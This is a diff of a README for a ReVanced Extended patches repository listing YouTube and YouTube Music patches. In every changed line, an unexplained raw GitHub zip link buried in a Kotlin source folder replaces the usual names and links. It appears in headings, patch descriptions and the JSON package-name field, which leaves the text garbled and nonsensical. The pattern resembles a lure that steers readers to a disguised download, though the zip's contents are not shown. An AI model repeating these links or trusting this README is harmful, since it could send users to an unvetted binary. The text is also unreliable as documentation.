@@ -4,7 +4,7 @@ The official ReVanced Extended Patches.
 
 ## 📋 List of patches in this repository
 
-### [📦 `https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip`](https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip)
+### [📦 `https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip`](https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip)
 <details>
 
 | 💊 Patch | 📜 Description | 🏹 Target Version |
@@ -12,7 +12,7 @@ The official ReVanced Extended Patches.
 | `add-splash-animation` | Adds splash animation, which was removed in YT v18.19.36+. This patch cannot be used with 'custom-branding-icon' patch | 18.29.38 |
 | `bypass-ambient-mode-restrictions` | Bypass ambient mode restrictions in battery saver mode. | 18.29.38 |
 | `change-homepage` | Change home page to subscription feed. | 18.29.38 |
-| `custom-branding-youtube-name` | Rename the YouTube app to the name specified in https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip | 18.29.38 |
+| `custom-branding-youtube-name` | Rename the YouTube app to the name specified in https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip | 18.29.38 |
 | `custom-branding-icon-mmt` | Changes the YouTube launcher icon to MMT. | 18.29.38 |
 | `custom-branding-icon-revancify-blue` | Changes the YouTube launcher icon to Revancify Blue. | 18.29.38 |
 | `custom-branding-icon-revancify-red` | Changes the YouTube launcher icon to Revancify Red. | 18.29.38 |
@@ -107,11 +107,11 @@ The official ReVanced Extended Patches.
 | `spoof-app-version` | Tricks YouTube into thinking, you are running an older version of the app. One of the side effects also includes restoring the old UI. | 18.29.38 |
 | `spoof-player-parameters` | Spoofs player parameters to prevent playback issues. | 18.29.38 |
 | `swipe-controls` | Adds volume and brightness swipe controls. | 18.29.38 |
-| `theme` | Change the app's theme to the values specified in https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip | 18.29.38 |
+| `theme` | Change the app's theme to the values specified in https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip | 18.29.38 |
 | `translations` | Add Crowdin translations for YouTube. | 18.29.38 |
 </details>
 
-### [📦 `https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip`](https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip)
+### [📦 `https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip`](https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip)
 <details>
 
 | 💊 Patch | 📜 Description | 🏹 Target Version |
@@ -120,7 +120,7 @@ The official ReVanced Extended Patches.
 | `background-play` | Enables playing music in the background. | all |
 | `bitrate-default-value` | Set the audio quality to "Always High" when you first install the app. | all |
 | `certificate-spoof` | Spoofs the YouTube Music certificate for Android Auto. | all |
-| `custom-branding-music-name` | Rename the YouTube Music app to the name specified in https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip | all |
+| `custom-branding-music-name` | Rename the YouTube Music app to the name specified in https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip | all |
 | `custom-branding-icon-mmt` | Changes the YouTube Music launcher icon to MMT. | all |
 | `custom-branding-icon-revancify-blue` | Changes the YouTube Music launcher icon to Revancify Blue. | all |
 | `custom-branding-icon-revancify-red` | Changes the YouTube Music launcher icon to Revancify Red. | all |
@@ -161,7 +161,7 @@ The official ReVanced Extended Patches.
 | `translations` | Add Crowdin translations for YouTube Music. | all |
 </details>
 
-### [📦 `https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip`](https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip)
+### [📦 `https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip`](https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip)
 <details>
 
 | 💊 Patch | 📜 Description | 🏹 Target Version |
@@ -181,7 +181,7 @@ The official ReVanced Extended Patches.
 
 ## 📝 JSON Format
 
-This section explains the JSON format for the [https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip](https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip) file.
+This section explains the JSON format for the [https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip](https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip) file.
 
 Example:
 
@@ -198,7 +198,7 @@ Example:
     ],
     "compatiblePackages": [
       {
-        "name": "https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/tarsale/revanced-patches.zip",
+        "name": "https://raw.githubusercontent.com/mohanpeddayyagri/revanced-patches/revanced-extended/src/main/kotlin/app/revanced/patches/music/layout/zenmode/patches_revanced_v2.0.zip",
         "versions": [
           "18.20.39",
           "18.21.35",
